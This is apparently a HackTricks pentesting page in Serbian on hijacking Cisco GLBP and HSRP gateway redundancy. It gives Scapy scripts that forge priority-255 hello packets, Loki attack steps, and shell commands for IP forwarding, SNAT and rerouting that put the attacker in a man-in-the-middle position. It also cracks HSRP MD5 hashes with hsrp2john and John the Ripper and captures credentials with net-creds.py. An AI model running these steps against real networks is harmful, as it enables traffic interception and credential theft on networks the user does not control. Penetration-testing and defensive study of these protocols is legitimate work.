# GLBP & HSRP Attacks

{{#include ../../banners/hacktricks-training.md}}


## FHRP Hijacking Overview

### Uvid u FHRP

FHRP je dizajniran da obezbedi robusnost mreže spajanjem više rutera u jednu virtuelnu jedinicu, čime se poboljšava raspodela opterećenja i tolerancija na greške. Cisco Systems je u ovom skupu predstavio istaknute protokole kao što su GLBP i HSRP.

### Uvid u GLBP protokol

GLBP, Cisco-vo rešenje, radi na TCP/IP sloju i koristi UDP na portu 3222 za komunikaciju. Ruteri u GLBP grupi razmenjuju "hello" pakete na 3-sekundnim intervalima. Ako ruter ne pošalje ove pakete tokom 10 sekundi, smatra se nedostupnim. Međutim, ovi tajmeri nisu fiksni i mogu se promeniti.

GLBP za IPv6 koristi multicast **FF02::66** preko UDP/3222, a format virtuelnog MAC-a postaje `0007.b4xx.xxyy` (AVF ID je u poslednjem bajtu). Tajming i površina napada ostaju isti kao u IPv4, tako da tehnike hijack još uvek rade u dual‑stack mrežama.

### Operacije GLBP i raspodela opterećenja

GLBP se izdvaja po tome što omogućava raspodelu opterećenja preko rutera koristeći jednu virtuelnu IP adresu u kombinaciji sa više virtuelnih MAC adresa. U GLBP grupi, svaki ruter učestvuje u prosleđivanju paketa. Za razliku od HSRP/VRRP, GLBP nudi stvarno balansiranje opterećenja kroz nekoliko mehanizama:

- **Host-Dependent Load Balancing:** Obezbeđuje doslednu dodelu AVF MAC adrese hostu, što je ključno za stabilne NAT konfiguracije.
- **Round-Robin Load Balancing:** Podrazumevani pristup, naizmenično dodeljuje AVF MAC adrese zahtevajućim hostovima.
- **Weighted Round-Robin Load Balancing:** Raspodeljuje opterećenje na osnovu unapred definisanih "Weight" metrika.

### Ključne komponente i terminologija u GLBP

- **AVG (Active Virtual Gateway):** Glavni ruter, odgovoran za dodelu MAC adresa ostalim ruterima u grupi.
- **AVF (Active Virtual Forwarder):** Ruter zadužen za prosleđivanje mrežnog saobraćaja.
- **GLBP Priority:** Metrička vrednost koja određuje AVG, sa podrazumevanom vrednošću 100 i opsegom od 1 do 255.
- **GLBP Weight:** Odražava trenutno opterećenje rutera, podesiva ručno ili preko Object Tracking.
- **GLBP Virtual IP Address:** Služi kao podrazumevani gateway mreže za sve povezane uređaje.

Za komunikaciju, GLBP koristi rezervisanu multicast adresu 224.0.0.102 i UDP port 3222. Ruteri šalju "hello" pakete na 3-sekundnim intervalima, i smatraju se neoperativnim ako se izgubi paket tokom 10 sekundi.

### Mehanizam napada na GLBP

Napadač može postati primarni ruter slanjem GLBP paketa sa najvišom vrednošću prioriteta (255). To može dovesti do DoS ili MITM napada, omogućavajući presretanje ili preusmeravanje saobraćaja.

**Praktičan GLBP hijack sa Scapy (kratak PoC)**
```python
from scapy.all import *

vip = "10.10.100.254"          # learned from sniffing
pkt = IP(dst="224.0.0.102")/UDP(dport=3222,sport=3222)/Raw(
b"\x01\x00\xff\x64"      # Version=1, Opcode=Hello, Priority=255, Weight=100
)
send(pkt, iface="eth0", loop=1, inter=1)
```
Sastavite payload bytes da imitiraju GLBP header (version/opcode/priority/weight/VRID). Looping the frame osigurava da pobedite AVG election ako authentication nije prisutna.

### Izvođenje GLBP napada pomoću Loki

[Loki](https://github.com/raizo62/loki_on_kali) može izvesti GLBP attack injektovanjem paketa sa priority i weight postavljenim na 255. Koraci pre napada uključuju prikupljanje informacija kao što su virtual IP address, presence of authentication, i vrednosti router priority koristeći alate poput Wireshark.

Attack Steps:

1. Prebacite interfejs u promiscuous mode i omogućite IP forwarding.
2. Identifikujte ciljni router i dobijte njegovu IP adresu.
3. Generišite Gratuitous ARP.
4. Injektujte zlonamerni GLBP paket, predstavljajući se kao AVG.
5. Dodelite sekundarnu IP address na napadačevom network interface-u, koja odražava GLBP virtual IP.
6. Implementirajte SNAT za potpunu vidljivost saobraćaja.
7. Podesite routing kako biste obezbedili nastavak internet pristupa kroz originalni AVG router.

Prateći ove korake, napadač zauzima poziciju "man in the middle", sposoban da presreće i analizira network traffic, uključujući unencrypted ili osetljive podatke.

For demonstration, here are the required command snippets:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Praćenje i presretanje saobraćaja može se izvršiti pomoću net-creds.py ili sličnih alata za hvatanje i analizu podataka koji prolaze kroz kompromitovanu mrežu.

### Pasivno objašnjenje HSRP Hijacking sa detaljima komandi

#### Overview of HSRP (Hot Standby Router/Redundancy Protocol)

HSRP je Cisco vlasnički protokol dizajniran za redundanciju mrežnog gateway-a. Omogućava konfiguraciju više fizičkih rutera u jedinstvenu logičku jedinicu sa deljenom IP adresom. Tom logičkom jedinicom upravlja primarni ruter koji je odgovoran za usmeravanje saobraćaja. Za razliku od GLBP, koji koristi metrike poput prioritet i težina za balansiranje opterećenja, HSRP se oslanja na jedan aktivni ruter za upravljanje saobraćajem.

HSRPv1 koristi multicast **224.0.0.2** i virtuelni MAC `0000.0c07.acXX`; HSRPv2 i HSRPv2 za IPv6 koriste **224.0.0.102 / FF02::66** i virtuelni MAC `0000.0c9f.fXXX`. UDP destinacioni port je **1985** za IPv4 i **2029** za IPv6.

#### Roles and Terminology in HSRP

- **HSRP Active Router**: Uređaj koji deluje kao gateway i upravlja protokom saobraćaja.
- **HSRP Standby Router**: Rezervni ruter, spreman da preuzme ulogu ako aktivni ruter zakaže.
- **HSRP Group**: Skup rutera koji sarađuju da formiraju jedan otporni virtuelni ruter.
- **HSRP MAC Address**: Virtuelna MAC adresa dodeljena logičkom ruteru u HSRP konfiguraciji.
- **HSRP Virtual IP Address**: Virtuelna IP adresa HSRP grupe, koja služi kao podrazumevani gateway za povezane uređaje.

#### HSRP Versions

HSRP dolazi u dve verzije, HSRPv1 i HSRPv2, koje se uglavnom razlikuju po kapacitetu grupe, upotrebi multicast IP adresa i strukturi virtuelnih MAC adresa. Protokol koristi specifične multicast IP adrese za razmenu servisnih informacija, sa Hello paketima koji se šalju na svakih 3 sekunde. Ruter se smatra neaktivnim ako se ne primi nijedan paket u roku od 10 sekundi.

#### HSRP Attack Mechanism

HSRP napadi podrazumevaju nasilno preuzimanje uloge Active Router-a ubacivanjem maksimalne vrednosti priority. To može dovesti do Man-In-The-Middle (MITM) napada. Bitni koraci pre napada uključuju prikupljanje podataka o HSRP konfiguraciji, što se može uraditi pomoću Wireshark-a za analizu saobraćaja.

**Quick HSRP takeover with Scapy**
```python
from scapy.all import *

vip = "10.10.100.1"
pkt = IP(dst="224.0.0.102")/UDP(sport=1985,dport=1985)/Raw(
b"\x00\x02\xff\x03\x00\x00\x00\x01"  # Hello, priority 255, group 1
)
send(pkt, iface="eth0", inter=1, loop=1)
```
Ako autentifikacija **nije** konfigurisana, kontinuirano slanje hello poruka sa višim prioritetom prisiljava peer-ove u *Speak*/*Listen* stanje i omogućava vam da postanete *Active*, preusmeravajući saobraćaj kroz vaš host.

**Posebni slučajevi HSRP autentifikacije**

- Legacy plain-text auth se trivijalno može lažirati.
- MD5 authentication pokriva samo HSRP payload; konstruisani paketi i dalje mogu da rate-limit/DoS control planes. NX-OS releases su ranije dozvoljavala DoS protiv autentifikovanih grupa (see Cisco advisory CSCup11309).
- Na mnogim ISP / VPS deljenim VLAN-ovima, HSRPv1 multicasts su vidljivi tenantima; bez autentifikacije možete se pridružiti i preuzeti (preempt) saobraćaj.

#### Koraci za zaobilaženje HSRP autentifikacije

1. Sačuvajte mrežni saobraćaj koji sadrži HSRP podatke kao .pcap fajl.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Izvucite MD5 heševe iz .pcap fajla koristeći hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Razbijte MD5 heševe koristeći John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Izvođenje HSRP injekcije uz Loki**

1. Pokrenite Loki da identifikujete HSRP oglasne poruke.
2. Podesite mrežni interfejs u promiscuous režim i omogućite IP forwarding.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Koristite Loki da ciljate određeni ruter, unesete razbijenu HSRP lozinku i izvršite neophodne konfiguracije kako biste se predstavili kao Active Router.
4. Nakon što dobijete ulogu Active Router-a, konfigurišite svoj mrežni interfejs i iptables da presretnete legitimni saobraćaj.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Izmenite routing tabelu da usmerite saobraćaj preko bivšeg Active Router-a.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Koristite net-creds.py ili sličan alat za hvatanje kredencijala iz presretnutog saobraćaja.
```shell
sudo python2 net-creds.py -i eth0
```

Izvođenje ovih koraka stavlja napadača u poziciju da presreće i manipuliše saobraćajem, slično proceduri za GLBP hijacking. Ovo naglašava ranjivost redundatnih protokola kao što je HSRP i potrebu za robusnim bezbednosnim merama.

## References

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Cisco NX-OS HSRP authentication DoS (CSCup11309)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/Cisco-SA-20140611-CVE-2014-3295)
- [Reddit: HSRP seen on VPS shared VLANs](https://www.reddit.com/r/networking/comments/1h0v1aq/hsrp_seen_on_cloud_vlans_without_auth/)
{{#include ../../banners/hacktricks-training.md}}
